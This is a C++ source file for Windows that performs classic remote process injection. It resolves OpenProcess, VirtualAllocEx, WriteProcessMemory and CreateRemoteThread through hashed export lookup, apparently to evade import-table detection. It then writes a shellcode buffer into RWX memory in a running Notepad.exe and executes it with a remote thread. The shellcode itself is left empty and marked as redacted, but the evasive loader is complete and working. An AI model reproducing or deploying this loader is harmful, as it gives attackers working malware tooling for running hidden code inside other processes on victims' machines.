#include <Windows.h>
#include <TlHelp32.h>
#include <string>

using customCPA = HANDLE(WINAPI*)(
	LPCSTR                lpApplicationName,
	LPSTR                 lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCSTR                lpCurrentDirectory,
	LPSTARTUPINFOA        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

using customCRT = HANDLE(WINAPI*)(
	HANDLE hProcess,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	DWORD dwCreationFlags,
	LPDWORD lpThreadId
	);

using customOP = HANDLE(WINAPI*)(
	DWORD dwDesiredAccess,
	BOOL bInheritHandle,
	DWORD dwProcessId
	);

using customVAEx = LPVOID(WINAPI*)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect
	);

using customWPM = BOOL(WINAPI*)(
	HANDLE hProcess,
	LPVOID lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T nSize,
	SIZE_T* lpNumberOfBytesWritten
	);

DWORDLONG funHash(const std::string& input) {
    // Initialize a 64-bit hash value
    DWORDLONG hash_value = 0x1234567890ABCDEF;

    // Process each character in the string
    for (char c : input) {
        // Convert character to its ASCII value
        DWORDLONG char_value = static_cast<DWORDLONG>(c);

        // Combine the character into the hash using bitwise operations
        hash_value ^= (char_value * 0x45D9F3B) & 0xFFFFFFFFFFFFFFFF; // Mix with a prime constant
        hash_value = ((hash_value << 7) | (hash_value >> (64 - 7))) & 0xFFFFFFFFFFFFFFFF; // Rotate left
        hash_value += char_value & 0xFFFFFFFFFFFFFFFF; // Add character value
    }

    return hash_value;
}

PDWORD findApi(const char* library, DWORDLONG hash) {

    PDWORD functionAddress = (PDWORD)0;

	// Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread)
	HMODULE libraryBase = LoadLibraryA(library);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

	// Get RVAs to exported function related information
	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	// Iterate through exported functions, calculate their hashes and check if any of them match our hash
	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;

		// Calculate hash for this exported function
		DWORDLONG functionNameHash = funHash(functionName);

		// If hash is found, resolve the function address
		if (functionNameHash == hash)
		{
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			return functionAddress;
		}
	}
}

DWORD getProcessID(const std::wstring& processName) {
	// Take a snapshot of all processes in the system
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0; // Return 0 if snapshot creation fails
	}

	// Initialize the PROCESSENTRY32 structure
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Start iterating over processes
	if (Process32First(hSnapshot, &pe32)) {
		do {
			// Compare the process name (case-insensitive)
			if (wcscmp(pe32.szExeFile, processName.data()) == 0) {
				// Found the process; return its PID
				DWORD pid = pe32.th32ProcessID;
				CloseHandle(hSnapshot); 
				return pid;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return 0;
}

// redacted shellcode
unsigned char shellcode[] = "";


int main() {

	auto cpa_h = funHash("CreateProcessA");
	auto crt_h = funHash("CreateRemoteThread");
	auto op_h = funHash("OpenProcess");
	auto vaex_h = funHash("VirtualAllocEx");
	auto wpm_h = funHash("WriteProcessMemory");

	auto cpa_found = findApi("kernel32.dll", cpa_h);
	auto crt_found = findApi("kernel32.dll", crt_h);
	auto op_found = findApi("kernel32.dll", op_h);
	auto vaex_found = findApi("kernel32.dll", vaex_h);
	auto wpm_found = findApi("kernel32.dll", wpm_h);


	customCPA cpa = (customCPA)cpa_found;
	customCRT crt = (customCRT)crt_found;
	customOP op = (customOP)op_found;
	customVAEx vaex = (customVAEx)vaex_found;
	customWPM wpm = (customWPM)wpm_found;

	DWORD dwFlags = 0;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(STARTUPINFOA);

	HANDLE hProc;
	HANDLE remoteThread;

	// hProc = cpa("C:\\Windows\\notepad.exe", NULL, NULL, NULL, false, dwFlags, NULL, NULL, &si, &pi);
	hProc = op(PROCESS_ALL_ACCESS, FALSE, getProcessID(L"Notepad.exe"));
	auto remoteBuffer = vaex(hProc, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	wpm(hProc, remoteBuffer, shellcode, sizeof(shellcode), NULL);
	remoteThread = crt(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	auto err = ::GetLastError();

	CloseHandle(hProc);

	// cpa("C:\\Windows\\notepad.exe", NULL, NULL, NULL, false, dwFlags, NULL, NULL, &si, &pi);

	return 0;
}